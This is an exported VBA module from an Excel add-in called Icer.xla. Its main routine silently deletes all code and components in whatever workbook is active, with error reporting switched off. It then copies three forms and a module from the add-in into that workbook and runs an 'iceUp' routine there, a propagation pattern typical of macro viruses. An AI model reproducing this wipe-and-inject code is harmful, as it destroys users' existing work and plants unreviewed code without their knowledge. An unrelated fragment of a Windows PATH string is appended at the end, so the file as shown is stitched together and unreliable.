Attribute VB_Name = "Module1"
Sub starticer()
Attribute starticer.VB_ProcData.VB_Invoke_Func = " \n14"
deleteCode
importForm1
importForm2
importForm3
importmodule1
callModule1
End Sub

Sub importForm1()
Attribute importForm1.VB_ProcData.VB_Invoke_Func = " \n14"

Dim srcWB As Workbook
Dim destWb As Workbook
Const sStr As String = "C:\Documents and Settings\Administrator\Application Data\Microsoft\AddIns\Icer.frm"

Set srcWB = Workbooks("Icer.xla")
Set destWb = ActiveWorkbook

srcWB.VBProject.VBComponents("Form1").Export _
Filename:=sStr
destWb.VBProject.VBComponents.Import _
Filename:=sStr
Kill sStr
'Import Form1

End Sub

Sub importForm2()
Attribute importForm2.VB_ProcData.VB_Invoke_Func = " \n14"

Dim srcWB As Workbook
Dim destWb As Workbook
Const sStr As String = "C:\Documents and Settings\Administrator\Application Data\Microsoft\AddIns\Icer.frm"

Set srcWB = Workbooks("Icer.xla")
Set destWb = ActiveWorkbook

srcWB.VBProject.VBComponents("Form2").Export _
Filename:=sStr
destWb.VBProject.VBComponents.Import _
Filename:=sStr
Kill sStr
'Import Form2

End Sub

Sub importForm3()
Attribute importForm3.VB_ProcData.VB_Invoke_Func = " \n14"

Dim srcWB As Workbook
Dim destWb As Workbook
Const sStr As String = "C:\Documents and Settings\Administrator\Application Data\Microsoft\AddIns\Icer.frm"

Set srcWB = Workbooks("Icer.xla")
Set destWb = ActiveWorkbook

srcWB.VBProject.VBComponents("Form3").Export _
Filename:=sStr
destWb.VBProject.VBComponents.Import _
Filename:=sStr
Kill sStr
'Import Form3

End Sub

Sub importmodule1()
Attribute importmodule1.VB_ProcData.VB_Invoke_Func = " \n14"
Dim DocName As String
Dim FName As String

DocName = ActiveWorkbook.Name

With Workbooks("Icer.xla")
FName = .Path & "\code.txt"
.VBProject.VBComponents("Modulex").Export FName
End With
Workbooks(DocName).VBProject.VBComponents.Import FName
End Sub

Sub callModule1()
Attribute callModule1.VB_ProcData.VB_Invoke_Func = " \n14"
Dim DocName As String
Dim Wbname As String

DocName = ActiveWorkbook.Name

Application.Run (DocName & "!iceUp")

End Sub

Sub deleteCode()
Attribute deleteCode.VB_ProcData.VB_Invoke_Func = " \n14"
     
On Error Resume Next
    With ActiveWorkbook.VBProject
        For x = .VBComponents.Count To 1 Step -1
            .VBComponents.Remove .VBComponents(x)
        Next x
        For x = .VBComponents.Count To 1 Step -1
            .VBComponents(x).CodeModule.DeleteLines _
            1, .VBComponents(x).CodeModule.CountOfLines
        Next x
    End With
On Error GoTo 0
     
End Sub








t a \ R o a m i n g \ P y t h o n \ P y t h o n 3 7 \ S c r i p t s ; C : \ P r o g r a m   F i l e s \ q e m u ; C : \ U s e r s \ c a c 6 9 \ A p p D a t a \ L o c a l \ P r o g r a m s \ M i c r o s o f t   V S   C o d e \ b i n ; C : \ P r o g r a m   F i l e s \ J e t B r a i n s \ I n t e l l i J   I D E A   2 0 2 1 . 1 . 3 \ b i n ; C : \ U s e r s \ c a c 6 9 \ s o u r c e \ m a v e n \ b i n ; C : \ P r o g r a m   F i l e s   ( x 8 6 ) \ M i c r o s o f t   O f f i c e \ r o o t \ C l i e n t    